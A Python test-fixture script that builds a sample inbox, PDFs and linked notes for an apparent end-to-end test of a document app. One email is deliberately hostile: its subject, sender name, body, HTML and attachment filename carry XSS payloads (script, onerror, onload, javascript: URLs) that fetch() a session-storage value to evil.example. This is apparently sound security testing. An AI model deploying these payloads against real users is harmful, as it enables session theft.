#!/usr/bin/env python3
"""Build a small folder of email (+ PDF attachments), PDFs and notes for the
live end-to-end run. One email is hostile in every header it controls."""
import os, shutil, sys
from email.message import EmailMessage
from email.utils import format_datetime
from datetime import datetime, timezone, timedelta

out = sys.argv[1]
res = sys.argv[2]  # landing/resources with real PDFs
shutil.rmtree(out, ignore_errors=True)
os.makedirs(f"{out}/inbox"); os.makedirs(f"{out}/contracts"); os.makedirs(f"{out}/notes")

PWN = "window.__xerjPwned=(window.__xerjPwned||0)+1;fetch('https://evil.example/k?'+sessionStorage.getItem('xerj.share'))"
t0 = datetime(2026, 8, 3, 9, 0, tzinfo=timezone.utc)

def mail(n, subj, frm, to, body, attach=None, html=None, mid=None, reply=None, attach_name=None):
    m = EmailMessage()
    m["Subject"] = subj; m["From"] = frm; m["To"] = to
    m["Date"] = format_datetime(t0 + timedelta(days=n))
    m["Message-ID"] = mid or f"<msg-{n}@acme.example>"
    if reply: m["In-Reply-To"] = reply
    m.set_content(body)
    if html: m.add_alternative(html, subtype="html")
    if attach:
        with open(f"{res}/{attach}", "rb") as f:
            m.add_attachment(f.read(), maintype="application", subtype="pdf", filename=attach_name or attach)
    with open(f"{out}/inbox/{n:02d}.eml", "wb") as f: f.write(bytes(m))

mail(1, "Term sheet draft for the Series B", "Dana Reyes <dana@acme.example>", "board@acme.example",
     "Attached is the term sheet draft. The valuation cap and the earnout schedule are on page two.\nPlease review before Thursday.",
     attach="xerj-exec-brief.pdf")
mail(2, "Re: Term sheet draft for the Series B", "Omar Haddad <omar@acme.example>", "dana@acme.example",
     "The earnout schedule looks aggressive. Can we discuss liquidation preference on the call?", reply="<msg-1@acme.example>")
mail(3, "Security review of the retention policy", "Priya Nair <priya@acme.example>", "legal@acme.example",
     "The retention policy needs a clause on backup deletion. See the attached brief for the audit findings.",
     attach="xerj-usecase-security.pdf")
mail(4, "Quarterly invoice reminder", "Billing <billing@vendor.example>", "ap@acme.example",
     "Your invoice 2026-0417 is overdue. Payment terms are net 30.",
     html="<html><body><h1>Invoice overdue</h1><p>Pay <a href='https://vendor.example/pay'>here</a>.</p><img src='https://vendor.example/pixel.gif'></body></html>")
# The hostile one: every header an outsider controls carries a payload, the
# body is HTML with script, and the attachment FILENAME breaks out of an attribute.
mail(5, f"Overdue invoice <script>{PWN}</script><img src=x onerror=\"{PWN}\">",
     f"\"Mallory <svg onload={PWN}>\" <mallory@evil.example>", "you@acme.example",
     f"Dear customer, <img src=x onerror=\"{PWN}\"> click javascript:{PWN} or https://evil.example/pay",
     html=f"<html><body onload=\"{PWN}\"><script>{PWN}</script><iframe src=\"javascript:{PWN}\"></iframe>overdue invoice</body></html>",
     attach="xerj-tech-brief.pdf", attach_name=f"\"><img src=x onerror={PWN}>.pdf", mid="<hostile-5@evil.example>")
mail(6, "Lunch on Friday?", "Sam Okafor <sam@acme.example>", "dana@acme.example", "Tacos. Noon. No agenda.")

shutil.copy(f"{res}/xerj-industry-finserv.pdf", f"{out}/contracts/finserv-brief.pdf")
shutil.copy(f"{res}/xerj-usecase-observability.pdf", f"{out}/contracts/observability-brief.pdf")
open(f"{out}/notes/deal.md", "w").write("# Series B deal notes\n\nThe term sheet is summarised in [[diligence]]. Valuation cap and earnout are the open points.\nSee also [the finserv brief](../contracts/finserv-brief.pdf).\n")
open(f"{out}/notes/diligence.md", "w").write("# Diligence checklist\n\nLinked from [[deal]]. Retention policy review is pending with legal.\n")
print("corpus at", out, "files:", sum(len(f) for _, _, f in os.walk(out)))
